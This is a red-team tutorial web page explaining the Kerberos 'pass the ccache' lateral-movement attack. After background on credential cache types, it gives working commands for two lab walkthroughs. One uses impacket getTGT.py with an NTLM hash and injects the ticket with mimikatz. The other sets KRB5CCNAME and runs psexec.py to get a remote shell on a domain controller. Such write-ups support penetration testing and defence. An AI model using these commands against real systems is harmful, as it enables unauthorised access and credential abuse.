<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/lateral-movement/" rel="category tag">Lateral Movement</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Lateral Movement: Pass the Ccache</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/lateral-movement-pass-the-ccache/" rel="bookmark"><time class="entry-date published" datetime="2020-05-25T07:55:13+00:00">May 25, 2020</time><time class="updated" datetime="2025-05-14T17:07:37+00:00">May 14, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this post, we’ll discuss how an attacker uses the ccache file to compromise kerberos authentication to access the application server without using a password. This attack is known as Pass the cacche (Ptc).</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<p><span style="color: #000000;">Credential Cache</span></p>
<p><span style="color: #000000;">Ccache Types</span></p>
<p><span style="color: #000000;">Walkthrough Pass the Ccache attack</span></p>
<ul>
<li><span style="color: #000000;">Method 1:Mimikatz</span></li>
<li><span style="color: #000000;">Method 2: KRB5CCNAME</span></li>
</ul>
<h3><span style="color: #800000;">Credential Cache</span></h3>
<p><span style="color: #000000;">A credential cache (or “ccache”) contains the Kerberos credential although it remains valid and, typically, while the user’s session lasts, so that multiple service authentication (e.g. connecting to a web or mail server more than once) does not involve contacting the KDC at every time.</span></p>
<p><span style="color: #000000;">A credential cache usually holds one initial ticket that users obtain using a password or another form of identity verification. If this ticket is ticket-granting, users can use it to obtain additional credentials without the password. Because the credential cache does not store the password, a compromised machine can cause less long-term damage to the user’s account.</span></p>
<p><span style="color: #000000;">A credentials cache stores a default client principal name, which the system sets when it creates the cache. This is the name shown at the top of the klist.</span></p>
<h3><span style="color: #800000;">Ccache Types</span></h3>
<p><span style="color: #000000;">The MIT Kerberos library supports several kinds of credentials cache. Not all platforms support them.</span></p>
<p><span style="color: #000000;"><strong>FILE caches: </strong>These are the simplest and most portable. A simple flat file format is used to store one credential after another. This is the default ccache type.</span></p>
<p><span style="color: #000000;"><strong>API:</strong> It is only implemented on Windows. It communicates with a server process that holds the credentials in memory for the user, rather than writing them to disk.</span></p>
<p><span style="color: #000000;"><strong>DIR points:</strong>  To the storage location of the collection of the credential caches in FILE: format. It is most useful when dealing with multiple Kerberos realms and KDCs.</span></p>
<p><span style="color: #000000;"><strong>KEYRING:</strong> It is Linux-specific, and uses the kernel keyring support to store credential data in unswappable kernel memory where only the current user should be able to access it.</span></p>
<p><span style="color: #000000;"><strong>MEMORY caches:</strong> These store credentials that don’t need availability outside of the current process. Memory caches are faster than file caches and automatically destroy themselves when the process exits.</span></p>
<p><span style="color: #000000;"><strong>MSLSA:</strong> It is a Windows-specific cache type that accesses the Windows credential store.</span></p>
<p><span style="color: #000000;">Read More about  MIT Kerberos Credenial Cache from here: <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html">https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html</a></strong></span></span></p>
<h3><span style="color: #800000;">Walkthrough Pass the Ccache attack</span></h3>
<p><span style="color: #000000;">Pass the ccache attack uses ticket granting ticket to access the application server without go by kerberos Authentication, here we will try to store Kerb5_tgt in form of ccache and use or pass this ccache file to service application server.</span></p>
<h4><span style="color: #800000;">Method 1:Mimikatz</span></h4>
<p><span style="color: #000000;">So we have use impacket python script <a style="color: #000000;" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py">gettgt.py</a> which will use a password, hash or aesKey, it will request a TGT and save it as ccache.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python getTGT.py -dc-ip 192.168.1.105 -hashes :32196b56ffe6f45e294117b91a83bf38 ignite.local/Administrator</pre>
<p><span style="color: #000000;">with the help of above command, you will be able to request Kerberos authorized ticket in the form of ccache whereas with the help of the following command you will be able to inject the ticket to access the resource.</span></p>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-EoX4SBxYv3M/Xst4UFwHcXI/AAAAAAAAkQQ/yQsviKOTlQEhVKtiXUfQhp0zEX8egq1KgCLcBGAsYHQ/s1600/1.png" alt="Lateral Movement using Pass the CCache" width="897" height="87"/></span></p>
<p><span style="color: #000000;">Once you have the ccache, use mimikatz to pass the ccache file and try to access the resource, thus you need to execute following commands:</span></p>
<p><span style="color: #000000;">privilege:debug</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">kerberos::ptc Administrator.ccache
misc::cmd</pre>
<p><span style="color: #000000;"><strong><em>Note:</em></strong><em> Here we first generated the ccache and then used mimiktaz, but you can also drag the ccache file from the memory using Klist-c, which will list all the ccache stored in the memory and then use mimikatz to access the resource.</em></span></p>
<p><span style="color: #000000;"><em> <img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-Gwz5uaQTEps/Xst4UDiIBTI/AAAAAAAAkQU/cVswBRvwH2w4bzUXY0eF8lzIno3n5qRtACLcBGAsYHQ/s1600/2.png" alt="Lateral Movement using Pass the CCache" width="687" height="344"/></em></span></p>
<p><span style="color: #000000;">And so a new command prompt will be triggered, which will be the CMD of the requested resource service. You can see how we access the resource without using the password or ticket.kirbi file to access the resource.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">push \\ignite.local\c$</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jI81PGINt3s/Xst4UepXwMI/AAAAAAAAkQY/hhct5kAvf68oidaJcqQNSqV8_UUULhg5gCLcBGAsYHQ/s1600/3.png"/></span></p>
<h4><span style="color: #800000;">Method 2: KRB5CCNAME</span></h4>
<p><span style="color: #000000;">Similarly, we use <strong>getTGT</strong> to generate the ccache and pass the ccache file for the requested service using <strong>KERB5CCNAME.</strong> This approach is a completely remote attack without using the local system of the compromised victim. However, you need to compromise NTLM hashes for that. Type the following to conduct the pass-the-ccache attack remotely.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python getTGT.py -dc-ip 192.168.1.105 -hashes :64fbae31cc352fc26af97cbdef151e03 ignite.local/yashika
export KRB5CCNAME=yashika.ccache; psexec.py -dc-ip 192.168.1.105 -target-ip 192.168.1.105 -no-pass -k ignite.local/yashika@WIN-S0V7KMTVLD2.ignite.local</pre>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-oekl0EpzC-8/Xst4VS3a5RI/AAAAAAAAkQc/pcmdGu0TpfgqckaWvjpaqfGGdxfLrg-jwCLcBGAsYHQ/s1600/6.png" alt="Lateral Movement using Pass the CCache" width="869" height="396"/></span></p>
<p><span style="color: #000000;">To learn more about Lateral Movement in Red Teaming. Follow this <strong><a href="https://www.hackingarticles.in/category/red-teaming/lateral-movement/">Link.</a></strong></span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <strong>Twitter</strong> and <strong><a style="color: #000000;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
